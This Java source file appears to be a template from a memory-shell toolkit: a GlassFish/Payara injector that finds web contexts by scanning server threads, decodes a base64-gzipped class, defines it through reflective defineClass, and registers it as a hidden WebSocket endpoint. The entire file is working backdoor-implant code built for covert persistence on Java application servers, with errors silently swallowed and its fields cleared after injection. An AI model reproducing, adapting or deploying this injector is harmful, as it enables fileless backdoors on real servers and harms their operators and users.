package org.leo.jmg.mem.injectortpl.glassfish;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * GlassFish / Payara WebSocket 内存马注入器。
 * <p>
 * Context 发现逻辑复用 {@link GlassFishFilterInjector}（基于 Tomcat 内核的
 * ContainerBackgroundProcessor 线程扫描），并通过 ServletContext
 * 获取 ServerContainer 并 addEndpoint。
 * <p>
 * GlassFish / Payara 使用 Tyrus 作为 JSR-356 实现，
 * ServerContainer 通过 ServletContext 属性获取。
 */
public class GlassFishWebSocketInjector {

    private static boolean ok = false;
    private static String urlPattern;
    private static String shellClassName;
    private static String shellClass;

    public GlassFishWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            contexts = null;
        }
        if (contexts != null && !contexts.isEmpty()) {
            for (Object context : contexts) {
                try {
                    Object shell = getShell(context);
                    inject(context, shell);
                } catch (Throwable ignored) {
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
        urlPattern = null;
    }

    /**
     * Context 发现逻辑与 GlassFishFilterInjector 一致。
     * GlassFish 的 Web 容器基于 Tomcat，使用相同的 ContainerBackgroundProcessor 线程扫描。
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(
                        getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object value : childrenMap.values()) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    /**
     * 获取 ServletContext，然后通过 JSR-356 ServerContainer 注册 WebSocket Endpoint。
     */
    public void inject(Object context, Object shell) throws Exception {
        Object servletContext = invokeMethod(context, "getServletContext", null, null);
        if (servletContext == null) {
            throw new RuntimeException("servletContext is null");
        }

        Object container = invokeMethod(servletContext, "getAttribute",
                new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute",
                    new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        if (container == null) {
            throw new RuntimeException("ServerContainer is null, WebSocket support may not be enabled");
        }

        ClassLoader contextClassLoader = getWebAppClassLoader(context);
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }
        Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
        constructor.setAccessible(true);
        Object builder = constructor.newInstance(shell.getClass(), urlPattern);
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        try {
            invokeMethod(container, "addEndpoint",
                    new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        } catch (Exception e) {
            // 已注册或路径冲突，忽略
        }
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }
}
